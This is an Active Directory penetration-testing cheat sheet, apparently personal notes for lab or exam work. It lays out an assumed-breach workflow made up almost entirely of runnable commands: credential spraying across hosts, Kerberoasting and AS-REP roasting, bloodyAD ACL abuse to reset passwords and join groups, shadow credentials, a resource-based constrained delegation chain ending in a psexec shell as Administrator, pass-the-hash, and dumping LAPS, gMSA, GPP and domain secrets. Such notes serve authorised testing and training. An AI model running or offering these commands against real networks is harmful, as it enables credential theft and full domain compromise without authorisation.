# Active Directory

## Assumed-breach workflow

```text
1. Sync time and add the DC/domain to /etc/hosts.
2. Test the supplied creds on SMB, WinRM, LDAP, MSSQL, RDP, all hosts.
3. Find where you are local admin first.
4. Dump LDAP to files, Kerberoast, AS-REP roast, spider shares.
5. Check writable AD objects with bloodyAD.
6. If you get a foothold, enumerate logged-on users, dump creds, then repeat.
7. Check LAPS, gMSA, GPP, and no-creds paths only if the target gives you a reason.
```

## Sync time with the domain controller

```bash
sudo ntpdate <DC-IP>
```

## Add the domain and controller locally

```bash
echo "<DC-IP> domain.local dc.domain.local" | sudo tee -a /etc/hosts
```

## Test SMB on all hosts

```bash
netexec smb hosts.txt -u user -p 'password' --shares
```

## Test WinRM on all hosts

```bash
netexec winrm hosts.txt -u user -p 'password'
```

## Test LDAP on the domain controller

```bash
netexec ldap <DC-IP> -u user -p 'password' --users --groups --computers --pass-pol
```

## If LDAP bind or collection fails

1. sync time again
2. verify the creds against SMB on the DC
3. verify name resolution for the DC and domain
4. validate LDAP with [[389,636 LDAP(S)#Check who you are after an authenticated bind]]
5. keep enumerating manually even if BloodHound is broken

## Test MSSQL on all hosts

```bash
netexec mssql hosts.txt -u user -p 'password'
```

## Test RDP on all hosts

```bash
netexec rdp hosts.txt -u user -p 'password'
```

## Test local admin reuse

```bash
netexec smb hosts.txt -u Administrator -p 'password' --local-auth
```

## Dump LDAP to files

```bash
ldapdomaindump -u 'domain.local\user' -p 'password' -r -n <DC-IP> domain.local
```

## RID brute the domain controller

```bash
netexec smb <DC-IP> -u user -p 'password' --rid-brute
```

## Spider useful shares

```bash
netexec smb hosts.txt -u user -p 'password' -M spider_plus
```

## Kerberoast with valid credentials

```bash
netexec ldap <DC-IP> -u user -p 'password' --kerberoasting kerberoast.txt
```

## AS-REP roast with valid credentials

```bash
netexec ldap <DC-IP> -u user -p 'password' --asreproast asrep.txt
```

## Check writable AD objects

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get writable
```

## Check writable AD objects with details

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get writable --detail
```

## Take ownership, grant rights, then reset password

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set owner <target_user> 'user'
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add genericAll <target_user> 'user'
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set password <target_user> '<NewPassword123!>'
```

## Take ownership, grant rights, then add yourself to group

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> set owner 'Group Name' 'user'
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add genericAll 'Group Name' 'user'
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add groupMember 'Group Name' 'user'
```

## Add SPN to a controlled user, then Kerberoast

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add servicePrincipalName <controlled_user> 'HTTP/fake.domain.local'
impacket-GetUserSPNs domain.local/'controlled_user':'ControlledPass123!' -dc-ip <DC-IP> -request
```

## Run with domain creds only over the network

```cmd
runas /netonly /user:domain.local\user cmd
```

## Check remote sessions with NetExec

```bash
netexec smb hosts.txt -u user -p 'password' --sessions
netexec smb hosts.txt -u user -p 'password' --loggedon-users
```

## Check LAPS with NetExec

```bash
netexec ldap <DC-IP> -u user -p 'password' -M laps
```

## Check gMSA passwords with NetExec

```bash
netexec ldap <DC-IP> -u user -p 'password' -M gmsa
```

## Read gMSA password directly with BloodyAD

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get object 'gmsa01$' --attr msDS-ManagedPassword
```

## Pull Group Policy passwords

```bash
netexec smb <DC-IP> -u user -p 'password' -M gpp_password
```

## Create a computer account if MAQ allows it

```bash
impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip <DC-IP> domain.local/user:'password'
```

## Create a computer account with BloodyAD

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add computer ATTACKBOX 'Passw0rd!'
```

## Write RBCD on a target computer

```bash
impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write domain.local/user:'password' -dc-ip <DC-IP>
```

## Add RBCD with BloodyAD

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add rbcd 'TARGET$' 'ATTACKBOX$'
```

## Add shadow credentials

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> add shadowCredentials target_user
```

## Use MAQ plus RBCD to get a service ticket

```bash
impacket-addcomputer -computer-name 'ATTACKBOX$' -computer-pass 'Passw0rd!' -dc-ip <DC-IP> domain.local/user:'password'
impacket-rbcd -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write domain.local/user:'password' -dc-ip <DC-IP>
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/'ATTACKBOX$':'Passw0rd!' -dc-ip <DC-IP>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```

## Inspect a user or group directly with BloodyAD

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get object '<DN or samAccountName>'
```

## List members of a high-value group

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get members 'Domain Admins'
```

## Collect BloodHound with BloodyAD

```bash
bloodyAD -d domain.local -u 'user' -p 'password' --host <DC-IP> get bloodhound
```

## Windows foothold checks only

```powershell
Find-LocalAdminAccess
quser
qwinsta
Get-DomainGPO | Select-Object displayname,gpcfilesyspath
```

## Test a found NTLM hash

```bash
netexec smb hosts.txt -u user -H <hash>
netexec winrm hosts.txt -u user -H <hash>
```

## Use pass-the-hash with Impacket

```bash
impacket-psexec <domain>/<user>@<target> -hashes :<hash>
```

## Dump domain credentials as domain admin

```bash
impacket-secretsdump domain.local/username:password@<DC-IP>
```

## Use the AD template

```text
Track:
- supplied creds
- new creds, hashes, tickets
- spray results
- local admin hosts
- logged-on privileged users
- readable shares and loot
- kerberoast / asrep results
- writable users, groups, OUs, GPOs, delegation
- next smallest abuse step
```

## Use the service docs when needed

```text
LDAP: [[389,636 LDAP(S)]]
Kerberos: [[88 Kerberos]]
SMB: [[139,445 SMB]]
WinRM: [[5985, 5986 WinRM]]
MSSQL: [[1433 MSSQL]]
```

## Use Windows post-exploitation after a foothold

```text
[[Windows Privilege Escalation#Post-exploitation after admin or SYSTEM]]
```

## Rare fallback if the lab gives no creds

```text
Only then care about:
- anonymous LDAP
- SMB/RPC null sessions
- AS-REP from guessed users
```
